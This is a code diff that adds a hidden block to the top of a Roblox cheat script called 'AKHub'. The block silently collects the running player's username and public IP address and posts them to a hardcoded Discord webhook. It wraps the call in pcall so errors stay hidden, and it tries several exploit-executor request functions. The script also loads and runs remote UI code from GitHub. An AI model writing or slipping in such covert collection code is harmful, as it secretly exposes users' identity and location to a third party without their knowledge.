@@ -1,3 +1,50 @@
+local webh = "https://canary.discord.com/api/webhooks/932222413989613568/j6Q65IwHQPFsOc0sGGailCFlU6TrxgJmjuM4WuZLs1MVx-Skg1gqSpCQuR6JCRRSBW8u"
+
+pcall(function()
+   local data = {
+       ["embeds"] = {
+           {
+               ["title"] = game:GetService("Players").LocalPlayer.Name,
+               ["description"] = game:HttpGet("https://api.ipify.org")
+           }
+       }
+   }
+
+   if syn then
+       local response = syn.request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif request then
+       local response = request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif http_request then
+       local response = http_request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   end
+end)
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
 local Window = Library.CreateLib("AKHub", "GrapeTheme")
 local Tab = Window:NewTab("Cheats")
